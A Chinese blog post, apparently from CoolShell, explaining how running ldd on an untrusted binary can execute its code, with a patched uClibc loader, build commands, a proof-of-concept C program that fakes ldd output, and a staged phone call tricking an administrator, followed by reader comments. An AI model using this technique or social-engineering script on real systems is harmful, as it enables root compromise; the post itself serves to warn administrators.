@@ -1,0 +1,575 @@
+<!DOCTYPE html><!--[if IE 8]>
+<html id="ie8" dir="ltr" lang="zh-CN"
+	prefix="og: https://ogp.me/ns#" >
+<![endif]--><!--[if !(IE 8) ]><!--><html dir="ltr" lang="zh-CN" prefix="og: https://ogp.me/ns#"><!--<![endif]--><head><meta charset="UTF-8"/><title>ldd 的一个安全问题 | 酷 壳 - CoolShell</title><link rel="stylesheet" type="text/css" href="/assets/all.min.css"/><link rel="shortcut icon" href="/assets/favicon.png"/></head>
+<body class="post-template-default single single-post postid-1626 single-format-standard group-blog">
+
+<div id="page" class="hfeed site">
+
+<div class="container">
+<div class="row">
+
+</div>
+</div>
+<div id="content" class="site-content">
+<div class="container">
+<div class="row">
+<div id="primary" class="content-area  col-md-12" style="margin-top: 40px;">
+<main id="main" role="main">
+<article id="post-1626" class="post-content post-1626 post type-post status-publish format-standard hentry category-unixlinux category-tools category-netsecurity tag-ldd tag-linux">
+<header class="entry-header">
+<span class="screen-reader-text">ldd 的一个安全问题</span>
+<h1 class="entry-title">ldd 的一个安全问题</h1>
+<div class="entry-meta">
+<h5 class="entry-date"><i class="fa fa-calendar-o"></i> <a href="/articles/1626.html" title="00:15" rel="bookmark"><time class="entry-date" datetime="2009-10-28T00:15:46+08:00" pubdate="">2009年10月28日 </time></a><span class="byline"><span class="sep"></span><i class="fa fa-user"></i>
+<span class="author vcard"><a class="url fn n" href="/articles/author/haoel" title="View all posts by 陈皓" rel="author">陈皓</a></span></span> <i class="fa fa-comments-o"></i><span class="screen-reader-text">评论 </span> <a href="/articles/1626.html#comments" class="comments-link">41 条评论</a> <i class="fa fa-users" style="margin-left:10px;"></i> 25,773 人阅读</h5>
+</div>
+</header>
+<div class="entry-content">
+<p>我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。</p>
+<p>首先，我们先来了解一下，我们怎么来使用ldd的，请你看一下下面的几个命令：</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">(1) $ ldd /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7eca000)
+        /lib/ld-linux.so.2 (0xb801e000)
+
+(2) $ LD_TRACE_LOADED_OBJECTS=1 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)
+        /lib/ld-linux.so.2 (0xb7f84000)
+
+(3) $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7f7c000)
+        /lib/ld-linux.so.2 (0xb80d0000)</pre>
+<p>第(1)个命令，我们运行了 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 于 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code>。我们可以看到命令的输出是我们想要的，那就是 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> 所依赖的动态链接库。</p>
+<p>第(2)个命令设置了一个叫 LD_TRACE_LOADED_OBJECTS 的环境变量，然后就好像在运行命令 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> (但其实并不是)。 其运行结果和ldd的输出是一样的！</p>
+<p>第(3)个命令也是设置了环境变量 LD_TRACE_LOADED_OBJECTS ，然后调用了动态链接库 <code data-enlighter-language="raw" class="EnlighterJSRAW">ld-linux.so</code> 并把 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> 作为参数传给它。我们发现，其输出结果还是和前面两个一样的。</p>
+<p><span id="more-1626"></span></p>
+<div id="ez-toc-container" class="ez-toc-v2_0_48 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction">
+<div class="ez-toc-title-container">
+<p class="ez-toc-title">目录</p>
+<span class="ez-toc-title-toggle"></span></div>
+<nav><ul class="ez-toc-list ez-toc-list-level-1 "><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F" title="具体发生了什么？">具体发生了什么？</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8" title="编译一个新的装载器">编译一个新的装载器</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80" title="小试 牛刀">小试 牛刀</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F" title="邪恶的程序">邪恶的程序</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D" title="邪恶的电话">邪恶的电话</a></li></ul></nav></div>
+<h4><span class="ez-toc-section" id="%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"></span>具体发生了什么？<span class="ez-toc-section-end"></span></h4>
+<p>对于第二个和第三个命令来说，好像是对 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 的一个包装或是一个隐式调用。对于第二个和第三个命令来说， <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> 这个命令就根本没有被运行。这是一个GNU动态载入器的怪异的特性。如果其注意到环境变量LD_TRACE_LOADED_OBJECTS 被设置了，那么它就不会去执行那个可运行的程序，而去输出这个可执行程序所依赖的动态链接库 （在BSD 系统上的<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 是一个C 程序)。</p>
+<p>如果你使用的是Linux，那么，你可以去看看 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 程序，你会发现这是一个 bash 的脚本。如果你仔细查看这个脚本的源码，你会发现，第二个命令和第三个命令的差别就在于 <code data-enlighter-language="raw" class="EnlighterJSRAW">ld-linux.so</code> 装载器是否可以被<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code>所装载，如果不能，那就是第二个命令，如果而的话，那就是第三个命令。</p>
+<p>所以，如果我们可以让<code data-enlighter-language="raw" class="EnlighterJSRAW">ld-linux.so</code> 装载器失效的话，或是让别的装载器来取代这个系统默认的动态链接库的话，那么我们就可以让 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code>来载入并运行我们想要程序了——使用不同的载装器并且不处理LD_TRACE_LOADED_OBJECTS 环境变量，而是直接运行程序。</p>
+<p>例如，你可以创建一个具有恶意的程序，如： ~/app/bin/exec 并且使用他自己的装载器 ~/app/lib/loader.so。如果某人（比如超级用户root） 运行了 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd /home/you/app/bin/exec</code> ，于是，他就玩完了。因为，那并不会列出所依赖的动态链接库，而是，直接执行你的那个恶意程序，这相当于，那个用户给了你他的授权。</p>
+<h4><span class="ez-toc-section" id="%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8"></span>编译一个新的装载器<span class="ez-toc-section-end"></span></h4>
+<p>下载 <a href="http://www.uclibc.org/">uClibc</a> C库。这是一个相当漂亮的代码，并且可以非常容易地修改一下源代码，使其忽略LD_TRACE_LOADED_OBJECTS 检查。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ mkdir app
+$ cd app
+app$ wget &#39;http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2&#39;</pre>
+<p>解压这个包，并执行 <code data-enlighter-language="raw" class="EnlighterJSRAW">make menuconfig</code>，选项你的平台架构（比如：i386），剩下的事情保持不变。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ bunzip2 &lt; uClibc-0.9.30.1.tar.bz2 | tar -vx
+$ rm -rf uClibc-0.9.30.1.tar.bz2
+$ cd uClibc-0.9.30.1
+$ make menuconfig</pre>
+<p>编辑 .config 并设置目标安装目录：到 <code data-enlighter-language="raw" class="EnlighterJSRAW">/home/you/app/uclibc</code>，<br/>
+把下面两行</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">RUNTIME_PREFIX=&#34;/usr/$(TARGET_ARCH)-linux-uclibc/&#34;
+DEVEL_PREFIX=&#34;/usr/$(TARGET_ARCH)-linux-uclibc/usr/&#34;</pre>
+<p>改成</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">RUNTIME_PREFIX=&#34;/home/you/app/uclibc/&#34;
+DEVEL_PREFIX=&#34;/home/you/app/uclibc/usr/&#34;</pre>
+<p>现在你需要改动一下其源代码，让其忽略LD_TRACE_LOADED_OBJECTS 环境变量的检查。 下面是个这修改的diff，你需要修改的是 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldso/ldso/ldso.c</code> 文件。你可把下面的这个diff存成一个叫file的文件，然后运行这个命令：<code data-enlighter-language="raw" class="EnlighterJSRAW">patch -p0 &lt; file</code>。如果你不这样做的话，那么，我们的黑客程序就无法工作，而我们的这个装载器还是会认为 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 想列出动态链接库的文件列表。</p>
+<p>[patch]<br/>
+— ldso/ldso/ldso-orig.c 2009-10-25 00:27:12.000000000 +0300<br/>
++++ ldso/ldso/ldso.c 2009-10-25 00:27:22.000000000 +0300<br/>
+@@ -404,9 +404,11 @@<br/>
+} #endif<br/>
++ /*<br/>
+if (_dl_getenv(&#34;LD_TRACE_LOADED_OBJECTS&#34;, envp) != NULL) {<br/>
+trace_loaded_objects++;<br/>
+}<br/>
++ */<br/>
+#ifndef __LDSO_LDD_SUPPORT__<br/>
+if (trace_loaded_objects) {<br/>
+[/patch]</p>
+<p>下面让我们来编译并安装它。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ make -j 4
+$ make install</pre>
+<p>于是，我们的 uClibc 装载器就被安装了，并且libc 库指向了 /home/you/app/uclibc. 就这么简单，现在，我们需要做的就是把我们的uClibc的装载器 (app/lib/ld-uClibc.so.0)变成默认的。</p>
+<h4><span class="ez-toc-section" id="%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80"></span>小试 牛刀<span class="ez-toc-section-end"></span></h4>
+<p>首先，先让我们来创建一个测试程序，这人程序也就是输出些自己的东西，这样可以让我们看到我们的程序被执行了。我们把这个程序放在 <code data-enlighter-language="raw" class="EnlighterJSRAW">app/bin/</code>下，叫“myapp.c”，下面是源代码</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+  if (getenv(&#34;LD_TRACE_LOADED_OBJECTS&#34;)) {
+    printf(&#34;All your things are belong to me.\n&#34;);
+  }
+  else {
+    printf(&#34;Nothing.\n&#34;);
+  }
+  return 0;
+}</pre>
+<p>这是一个很简单的代码了，这段代码主要检查一下环境变量LD_TRACE_LOADED_OBJECTS 是否被设置了，如果是，那么恶意程序执行，如果没有，那么程序什么也不发生。</p>
+<p>下面是编译程序的命令，，大家可以看到，我们静态链接了一些函数库。我们并不想让LD_LIBRARY_PATH这个变量来发挥作用。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ L=/home/you/app/uclibc
+$ gcc -Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0 \
+    -Wl,-rpath-link,$L/lib \
+    -nostdlib \
+    myapp.c -o myapp \
+    $L/usr/lib/crt*.o \
+    -L$L/usr/lib/ \
+    -lc</pre>
+<p>下面是GCC的各个参数的解释：</p>
+<ul>
+<li><strong>-Wl,–dynamic-linker,$L/lib/ld-uClibc.so.0</strong> — 指定一个新的装载器。</li>
+<li><strong>-Wl,-rpath-link,$L/lib</strong> — 指定一个首要的动态装载器所在的目录，这个目录用于查找动态库。</li>
+<li><strong>-nostdlib</strong> — 不使用系统标准库。</li>
+<li><strong>myapp.c -o myapp</strong> — 编译myapp.c 成可执行文件 myapp,</li>
+<li><strong>$L/usr/lib/crt*.o</strong> — 静态链接runtime 代码</li>
+<li><strong>-L$L/usr/lib/</strong> — libc 的目录（静态链接）</li>
+<li><strong>-lc</strong> —  C 库</li>
+</ul>
+<p>现在让我们来运行一下我们的 <code data-enlighter-language="raw" class="EnlighterJSRAW">myapp</code> （没有ldd，一切正常）</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">app/bin$ ./myapp
+Nothing.</pre>
+<p>LD_TRACE_LOADED_OBJECTS 没有设置，所以输出 “Nothing” 。</p>
+<p>现在，让我们来使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 来看看这个程序的最大的影响力，让我们以root身份来干这个事。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ su
+Password:
+# ldd ./myapp
+All your things are belong to me.</pre>
+<p>哈哈，我们可以看到，ldd触发了我们的恶意代码。于是，我们偷了整个系统！</p>
+<h4><span class="ez-toc-section" id="%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F"></span>邪恶的程序<span class="ez-toc-section-end"></span></h4>
+<p>下面这个例子更为实际一些，如果没有<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> ，那程序程序会报错 “error while loading shared libraries” ，这个错误信息会引诱你去去使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 去做检查，如果你是root的话，那么就整个系统就玩完了。而当你可以了 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 后，它会在干完坏事后，模仿正确的<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code>的输出，告诉你 <code data-enlighter-language="raw" class="EnlighterJSRAW">libat.so.0</code> 不存在。</p>
+<p>下面的代码仅仅是向你展示了一下整个想法，代码还需加工和改善。</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+/*
+This example pretends to have a fictitious library &#39;libat.so.0&#39; missing.
+When someone with root permissions runs `ldd this_program`, it does
+something nasty in malicious() function.
+
+I haven&#39;t implemented anything malicious but have written down some ideas
+of what could be done.
+
+This is, of course, a joke program. To make it look more real, you&#39;d have
+to bump its size, add some more dependencies, simulate trying to open the
+missing library, detect if ran under debugger or strace and do absolutely
+nothing suspicious, etc.
+*/
+
+void pretend_as_ldd()
+{
+    printf(&#34;\tlinux-gate.so.1 =&gt;  (0xffffe000)\n&#34;);
+    printf(&#34;\tlibat.so.0 =&gt; not found\n&#34;);
+    printf(&#34;\tlibc.so.6 =&gt; /lib/libc.so.6 (0xb7ec3000)\n&#34;);
+    printf(&#34;\t/lib/ld-linux.so.2 (0xb8017000)\n&#34;);
+}
+
+void malicious()
+{
+    if (geteuid() == 0) {
+        /* we are root ... */
+        printf(&#34;poof, all your box are belong to us\n&#34;);
+
+        /* silently add a new user to /etc/passwd, */
+        /* or create a suid=0 program that you can later execute, */
+        /* or do something really nasty */
+    }
+}
+
+int main(int argc, char **argv)
+{
+    if (getenv(&#34;LD_TRACE_LOADED_OBJECTS&#34;)) {
+        malicious();
+        pretend_as_ldd();
+        return 0;
+    }
+
+    printf(&#34;%s: error while loading shared libraries: libat.so.0: &#34;
+           &#34;cannot open shared object file: No such file or directory\n&#34;,
+           argv[0]);
+    return 127;
+}</pre>
+<p> </p>
+<h4><span class="ez-toc-section" id="%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D"></span>邪恶的电话<span class="ez-toc-section-end"></span></h4>
+<p>事实上来说，上面的那段程序可能的影响更具破坏性，因为大多数的系统管理员可能并不知道不能使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 去测试那些不熟悉的执行文件。下面是一段很可能会发现的对话，让我们看看我们的程序是如何更快地获得系统管理员的权限的。</p>
+<p>系统管理员的电话狂响……</p>
+<p>系统管理员： “同志你好，我是系统管理员，有什么可以帮你的？”</p>
+<p>黑客：“管理员同志你好。我有一个程序不能运行，总是报错，错误好像是说一个系统动态链接库有问题，你能不能帮我看看？”</p>
+<p>系统管理员：“没问题，你的那个程序在哪里？”</p>
+<p>黑客： “在我的home目录下，/home/hchen/app/bin/myapp”。</p>
+<p>系统管理员：“ OK，等一会儿”，黑客在电话这头可以听到一些键盘的敲击声。</p>
+<p>系统管理员：“好像是动态链接库的问题，你能告诉我你的程序具体需要什么样的动态链接库吗？”</p>
+<p>黑客说: “谢谢，应该没有别的嘛。”</p>
+<p>系统管理员：“嗯，查到了，说是没有了 <code data-enlighter-language="raw" class="EnlighterJSRAW">libat.so.0</code>这是你自己的动态链接库吗？”</p>
+<p>黑客说：“哦，好像是的，你等一下，我看看……” 黑客在那头露出了邪恶的笑，并且，讯速地输入了下面的命令：</p>
+<p style="padding-left: 30px;"><code data-enlighter-language="raw" class="EnlighterJSRAW">mv ~/.hidden/working_app ~/app/bin/myapp</code><br/>
+<code data-enlighter-language="raw" class="EnlighterJSRAW">mv ~/.hidden/libat.so.o ~/app/bin/</code></p>
+<p>黑客说：“哦，对了，的确是我的不对，我忘了把这个链接库拷过来了，现在应该可以了，谢谢你啊，真是不好意思，麻烦你了”</p>
+<p>系统管理员： “没事就行了，下次注意啊！”（然后系统管理心里暗骂，TMD，又一个白痴用户！……）</p>
+<p><strong>教训一：千万不要使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 去测试你不知道的文件！<br/>
+教训二：千万不要相信陌生人！</strong></p>
+<p>文章：<a href="http://www.catonmat.net/blog/ldd-arbitrary-code-execution/" target="_blank">来源</a>（以上文章并非完全翻译，我做过一些修改，所以，如果你要转载，请注明作者和出处）</p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div id="post-ratings-1626-loading" class="post-ratings-loading"><img src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif" width="16" height="16" class="post-ratings-image"/>Loading...</div>
+</div>
+<footer class="entry-footer">
+<hr/><div class="row"><div class="col-md-6 cattegories"><span class="cat-links"><i class="fa fa-folder-open"></i>
+<a href="javascript:void(0)" rel="category tag">Unix/Linux</a>, <a href="javascript:void(0)" rel="category tag">编程工具</a>, <a href="javascript:void(0)" rel="category tag">网络安全</a></span></div><div class="col-md-6 tags"><span class="tags-links"><i class="fa fa-tags"></i> <a href="javascript:void(0)" rel="tag">ldd</a>, <a href="javascript:void(0)" rel="tag">Linux</a></span></div></div> </footer>
+</article>
+
+<div class="fixed"></div> 
+</main>
+
+<div class="post-comments">
+<div id="comments" class="comments-area">
+<h2 class="comments-title">
+《<span>ldd 的一个安全问题</span>》的相关评论 </h2>
+<ol class="comment-list">
+<li id="comment-1672" class="comment even thread-even depth-1">
+<article id="div-comment-1672" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/da3942a989b6028f23c7585d86fa7f57?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/da3942a989b6028f23c7585d86fa7f57?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://li2z.cn" class="url" rel="ugc external nofollow">bones7456</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1672"><time datetime="2009-10-28T08:42:47+08:00">2009年10月28日 08:42</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>汗哦。。。这文章我喜欢~</p>
+</div>
+ </article>
+</li>
+<li id="comment-1673" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-1673" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/02529f3cc97c2acb9da0d24ff596f360?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/02529f3cc97c2acb9da0d24ff596f360?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://hi.baidu.com/jyf1987" class="url" rel="ugc external nofollow">无限</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1673"><time datetime="2009-10-28T09:01:58+08:00">2009年10月28日 09:01</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>昨晚刚看完英文的 您这翻译速度很快 羡慕您的英语能力阿</p>
+</div>
+ </article>
+</li>
+<li id="comment-1674" class="comment even thread-even depth-1">
+<article id="div-comment-1674" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/7ec415db35ad245e082f4059737964c8?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/7ec415db35ad245e082f4059737964c8?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">ostric</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1674"><time datetime="2009-10-28T12:51:33+08:00">2009年10月28日 12:51</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>原文在哪，我想看看有没有简单点的不用打电话的黑客，呵呵</p>
+</div>
+ </article>
+</li>
+<li id="comment-1675" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-1675" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/8a2f343f6a153bc2ddcf81aae32484ba?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/8a2f343f6a153bc2ddcf81aae32484ba?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://www.abettor.org/" class="url" rel="ugc external nofollow">abettor</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1675"><time datetime="2009-10-28T13:45:01+08:00">2009年10月28日 13:45</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>汗啊，曾经还以会用ldd而骄傲呢，经常把刚down下来的软件ldd一番，看他加载了什么so，以猜测他用的什么方法，干了什么事。<br/>
+如今看来，来历不明的程序不能轻易ldd呀！（这让我想起了Windowz下VC6的一个lib漏洞，得出的结论是：来历不明的代码不能轻易link。）<br/>
+尽量不用root才是王道啊！</p>
+</div>
+ </article>
+</li>
+<li id="comment-1676" class="comment byuser comment-author-haoel bypostauthor even thread-even depth-1">
+<article id="div-comment-1676" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/af2fbb7372dd5826e44d87e6ceccea40?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/af2fbb7372dd5826e44d87e6ceccea40?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">耗子</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1676"><time datetime="2009-10-28T13:54:46+08:00">2009年10月28日 13:54</time></a> </div>
+</footer>
+<div class="comment-content">
+<p><a href="#comment-1674" rel="nofollow">@ostric </a><br/>
+原文的链接我已经给在了整篇文章的最后。;-)</p>
+</div>
+ </article>
+</li>
+<li id="comment-1939" class="comment odd alt thread-odd thread-alt depth-1 parent">
+<article id="div-comment-1939" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/bd3ce8a1aae2727c553f9498a330b725?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/bd3ce8a1aae2727c553f9498a330b725?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://3www8.cn" class="url" rel="ugc external nofollow">laiwei</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1939"><time datetime="2009-11-14T23:31:47+08:00">2009年11月14日 23:31</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>文章内容很好<br/>
+排版也很不错<br/>
+ps：请问博主的代码编辑用的什么插件？</p>
+</div>
+ </article>
+<ol class="children">
+<li id="comment-1940" class="comment byuser comment-author-haoel bypostauthor even depth-2">
+<article id="div-comment-1940" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/af2fbb7372dd5826e44d87e6ceccea40?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/af2fbb7372dd5826e44d87e6ceccea40?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="https://coolshell.cn" class="url" rel="ugc">耗子</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1940"><time datetime="2009-11-15T10:23:43+08:00">2009年11月15日 10:23</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>代码高亮用的是SyntaxHighlighter Evolved插件.</p>
+</div>
+ </article>
+</li>
+</ol>
+</li>
+<li id="comment-10500" class="comment odd alt thread-even depth-1">
+<article id="div-comment-10500" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/96318f6e852868b7c9bbea4dcac789b4?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/96318f6e852868b7c9bbea4dcac789b4?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">zecho</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-10500"><time datetime="2010-09-29T09:32:38+08:00">2010年09月29日 09:32</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>“我们运行了 `ldd` 于 `/bin/grep` “ldd xxx (xxx代表为可执行文件)，这个命令的执行过程会执行xxx文件吗? 比如 ldd ./helloworld 会输出“Hello World”?</p>
+</div>
+ </article>
+</li>
+<li id="comment-42659" class="comment even thread-odd thread-alt depth-1">
+<article id="div-comment-42659" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/ddcbcf7a078d72e935cafd97a64761e4?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/ddcbcf7a078d72e935cafd97a64761e4?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">yuyichao</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-42659"><time datetime="2011-04-07T10:02:06+08:00">2011年04月07日 10:02</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>只要是静态连接的elf文件都可以作为链接器<br/>
+所以只要写一个静态连接的程序1 再把一个空的程序2的链接器指定为那个程序就可以在ldd 程序2的时候达到运行程序1的目的</p>
+<p>看来以后ldd前要看看objdump –section=.interp 阿</p>
+</div>
+ </article>
+</li>
+<li id="comment-122178" class="comment odd alt thread-even depth-1">
+<article id="div-comment-122178" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/cfec91188e41581941ca253632b9a62e?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/cfec91188e41581941ca253632b9a62e?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">ZzzCat</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-122178"><time datetime="2012-01-06T15:24:06+08:00">2012年01月06日 15:24</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>今天看到这篇文章才发现这个不错的blog<br/>
+我最近想弄一个自己的blog。问问前辈运维这样一个blog一年大概多少￥？<br/>
+因为我实在是受不了csdn，网摘收藏，友情连接添加，广告多得离谱。</p>
+</div>
+ </article>
+</li>
+<li id="comment-144353" class="comment even thread-odd thread-alt depth-1">
+<article id="div-comment-144353" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/1046f5dae42046d382ecf49e5ceed9d5?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/1046f5dae42046d382ecf49e5ceed9d5?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://zhiwu88.blog.hexun.com" class="url" rel="ugc external nofollow">zhiwu</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-144353"><time datetime="2012-03-12T17:09:04+08:00">2012年03月12日 17:09</time></a> </div>
+</footer>
+<div class="comment-content">
